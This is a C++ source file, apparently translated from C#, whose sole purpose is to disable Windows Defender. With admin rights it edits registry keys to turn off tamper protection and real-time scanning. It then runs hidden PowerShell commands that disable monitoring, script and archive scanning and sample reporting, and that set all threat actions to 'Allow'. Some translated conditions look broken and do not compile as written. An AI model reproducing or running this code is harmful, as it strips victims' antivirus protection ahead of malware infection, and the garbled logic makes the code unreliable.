#include "Program.h"

using namespace Microsoft::Win32;

namespace Disable_Windows_Defender
{

	void Program::Main()
	{
		WindowsPrincipal tempVar(WindowsIdentity::GetCurrent());
		if (!(&tempVar)->IsInRole(WindowsBuiltInRole::Administrator))
		{
			return;
		}

		RegistryEdit(LR"(SOFTWARE\Microsoft\Windows Defender\Features)", L"TamperProtection", L"0"); //Windows 10 1903 Redstone 6
		RegistryEdit(LR"(SOFTWARE\Policies\Microsoft\Windows Defender)", L"DisableAntiSpyware", L"1");
		RegistryEdit(LR"(SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection)", L"DisableBehaviorMonitoring", L"1");
		RegistryEdit(LR"(SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection)", L"DisableOnAccessProtection", L"1");
		RegistryEdit(LR"(SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection)", L"DisableScanOnRealtimeEnable", L"1");

		CheckDefender();
	}

	void Program::RegistryEdit(const std::wstring &regPath, const std::wstring &name, const std::wstring &value)
	{
		try
		{
			{
				RegistryKey *key = Registry::LocalMachine->OpenSubKey(regPath, RegistryKeyPermissionCheck::ReadWriteSubTree);
				if (key == nullptr)
				{
					Registry::LocalMachine->CreateSubKey(regPath)->SetValue(name, value, RegistryValueKind::DWord);
					return;
				}
				if (key->GetValue(name) != static_cast<void*>(value))
				{
					key->SetValue(name, value, RegistryValueKind::DWord);
				}
			}
		}
		catch (...)
		{
		}
	}

	void Program::CheckDefender()
	{
		Process *proc = new Process();
		proc->StartInfo = new ProcessStartInfo();
		proc->StartInfo->FileName = L"powershell";
		proc->StartInfo->Arguments = L"Get-MpPreference -verbose";
		proc->StartInfo->UseShellExecute = false;
		proc->StartInfo->RedirectStandardOutput = true;
		proc->StartInfo->WindowStyle = ProcessWindowStyle::Hidden;
		proc->StartInfo->CreateNoWindow = true;
		proc->Start();
		while (!proc->StandardOutput->EndOfStream)
		{
			std::wstring line = proc->StandardOutput->ReadLine();

			if (line.find(LR"(DisableRealtimeMonitoring)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
			}

			else if (line.find(LR"(DisableBehaviorMonitoring)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
			}

			else if (line.find(LR"(DisableBlockAtFirstSeen)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableBlockAtFirstSeen $true");
			}

			else if (line.find(LR"(DisableIOAVProtection)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
			}

			else if (line.find(LR"(DisablePrivacyMode)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
			}

			else if (line.find(LR"(SignatureDisableUpdateOnStartupWithoutEngine)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
			}

			else if (line.find(LR"(DisableArchiveScanning)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
			}

			else if (line.find(LR"(DisableIntrusionPreventionSystem)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection
			}

			else if (line.find(LR"(DisableScriptScanning)") != std::wstring::npos && line.find(L"False") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
			}

			else if (line.find(LR"(SubmitSamplesConsent)") != std::wstring::npos && !line.find(L"2") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting
			}

			else if (line.find(LR"(MAPSReporting)") != std::wstring::npos && !line.find(L"0") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -MAPSReporting 0"); //MAPSReporting
			}

			else if (line.find(LR"(HighThreatDefaultAction)") != std::wstring::npos && !line.find(L"6") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
			}

			else if (line.find(LR"(ModerateThreatDefaultAction)") != std::wstring::npos && !line.find(L"6") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
			}

			else if (line.find(LR"(LowThreatDefaultAction)") != std::wstring::npos && !line.find(L"6") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
			}

			else if (line.find(LR"(SevereThreatDefaultAction)") != std::wstring::npos && !line.find(L"6") != std::wstring::npos)
			{
				RunPS(L"Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
			}
		}
	}

	void Program::RunPS(const std::wstring &args)
	{
		Process *proc = new Process();
		proc->StartInfo = new ProcessStartInfo();
		proc->StartInfo->FileName = L"powershell";
		proc->StartInfo->Arguments = args;
		proc->StartInfo->WindowStyle = ProcessWindowStyle::Hidden;
		proc->StartInfo->CreateNoWindow = true;
		proc->Start();
	}
}
